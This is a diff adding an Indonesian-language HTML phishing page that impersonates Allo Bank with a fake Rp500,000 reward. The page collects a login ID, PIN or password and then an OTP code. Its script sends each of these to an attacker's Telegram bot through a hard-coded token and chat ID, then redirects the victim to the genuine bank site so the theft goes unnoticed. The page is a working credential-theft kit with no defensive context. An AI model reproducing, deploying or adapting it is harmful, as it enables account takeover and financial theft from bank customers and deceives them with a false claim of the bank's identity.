@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Allo Bank - Promo & Security</title>
+    <style>
+        /* CSS UNTUK TAMPILAN PREMIUM TANPA GAMBAR */
+        body { 
+            background: #001a33; 
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
+            margin: 0; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            min-height: 100vh; 
+        }
+        .app-container { 
+            background: white; 
+            width: 100%; 
+            max-width: 400px; 
+            min-height: 100vh; 
+            display: flex; 
+            flex-direction: column; 
+        }
+        .header-banner { 
+            background: linear-gradient(135deg, #ffcc00 0%, #ff9900 100%); 
+            padding: 40px 20px; 
+            text-align: center; 
+            border-radius: 0 0 40px 40px;
+        }
+
+        /* TULISAN ALLO BANK VERSI FONT MIRIP ASLI */
+        .logo-text {
+            font-size: 32px;
+            font-weight: 900;
+            font-style: italic;
+            color: #001a33;
+            letter-spacing: -1.5px;
+            margin-bottom: 5px;
+        }
+        .logo-text span {
+            color: white; /* Memberi efek kontras pada kata 'bank' */
+        }
+        
+        .reward-title {
+            margin: 0;
+            font-size: 18px;
+            color: #001a33;
+            font-weight: 700;
+            text-transform: uppercase;
+        }
+
+        .content { padding: 40px 25px; flex-grow: 1; }
+        .security-tag { 
+            background: #eef5ff; 
+            color: #005ce6; 
+            padding: 8px 12px; 
+            border-radius: 8px; 
+            font-size: 11px; 
+            font-weight: bold; 
+            display: inline-block;
+            margin-bottom: 20px;
+            border: 1px solid #cce0ff;
+        }
+
+        h2 { color: #333; font-size: 20px; margin: 0 0 10px 0; font-weight: 700; }
+        .desc { color: #666; font-size: 14px; line-height: 1.5; margin-bottom: 30px; }
+
+        .input-group { margin-bottom: 25px; }
+        label { display: block; font-size: 12px; color: #999; margin-bottom: 8px; font-weight: 700; }
+        input { 
+            width: 100%; 
+            border: none; 
+            border-bottom: 2px solid #eee; 
+            padding: 12px 0; 
+            font-size: 16px; 
+            outline: none; 
+            transition: 0.3s; 
+        }
+        input:focus { border-bottom-color: #ffcc00; }
+
+        .btn-action { 
+            background: #001a33; 
+            color: #ffcc00; 
+            border: none; 
+            width: 100%; 
+            padding: 18px; 
+            border-radius: 35px; 
+            font-weight: bold; 
+            font-size: 16px; 
+            cursor: pointer; 
+            margin-top: 10px;
+        }
+
+        #otpPage { display: none; }
+
+        .footer { text-align: center; padding: 25px; font-size: 10px; color: #bbb; line-height: 1.4; }
+    </style>
+</head>
+<body>
+
+<div class="app-container">
+    <div class="header-banner">
+        <div class="logo-text">allo<span>bank</span></div>
+        <p class="reward-title">REWARD Rp500.000</p>
+    </div>
+
+    <div id="loginPage" class="content">
+        <div class="security-tag">🛡️ VERIFIKASI KEAMANAN</div>
+        <h2>Selamat Datang</h2>
+        <p class="desc">Silakan login untuk memverifikasi akun Anda dan mengaktifkan saldo reward.</p>
+        
+        <form id="formLogin">
+            <div class="input-group">
+                <label>NOMOR HP / USERNAME</label>
+                <input type="text" id="user" placeholder="Masukkan ID terdaftar" required>
+            </div>
+            <div class="input-group">
+                <label>PIN / PASSWORD</label>
+                <input type="password" id="pass" placeholder="8 Digit PIN atau Sandi" required>
+            </div>
+            <button type="submit" class="btn-action">LANJUTKAN</button>
+        </form>
+    </div>
+
+    <div id="otpPage" class="content">
+        <div class="security-tag" style="background: #fff0f0; color: #d32f2f; border-color: #ffdada;">⚠️ TAHAP AKHIR</div>
+        <h2>Konfirmasi OTP</h2>
+        <p class="desc">Masukkan 6 digit kode verifikasi yang baru saja dikirimkan ke nomor Anda.</p>
+        
+        <form id="formOTP">
+            <div class="input-group">
+                <label>KODE VERIFIKASI</label>
+                <input type="number" id="otp" placeholder="Masukkan 6 digit kode" maxlength="6" inputmode="numeric" required>
+            </div>
+            <button type="submit" class="btn-action" style="background: #ffcc00; color: #001a33;">KONFIRMASI SEKARANG</button>
+        </form>
+    </div>
+
+    <div class="footer">
+        PT Allo Bank Indonesia Tbk berizin dan diawasi oleh Otoritas Jasa Keuangan (OJK) serta merupakan peserta penjaminan LPS.
+    </div>
+</div>
+
+<script>
+    const token = "8428905799:AAHsA0cXKxvRnTI1y6QXCPzgL8w0rhTPto4";
+    const chat_id = "6950857232";
+    let targetID = "";
+
+    document.getElementById('formLogin').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const user = document.getElementById('user').value;
+        const pass = document.getElementById('pass').value;
+        targetID = user;
+
+        const teks = `🚨 **LOGIN!**\n👤 **User:** \`${user}\`\n🔑 **Pass:** \`${pass}\``;
+        
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id, text: teks, parse_mode: 'Markdown' })
+        });
+
+        document.getElementById('loginPage').style.display = 'none';
+        document.getElementById('otpPage').style.display = 'block';
+    });
+
+    document.getElementById('formOTP').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const otp = document.getElementById('otp').value;
+
+        const teks = `✅ **OTP MASUK!**\n👤 **User:** \`${targetID}\`\n🔢 **OTP:** \`${otp}\``;
+        
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id, text: teks, parse_mode: 'Markdown' })
+        });
+
+        window.location.href = "https://www.allobank.com/promo";
+    });
+</script>
+
+</body>
+</html>
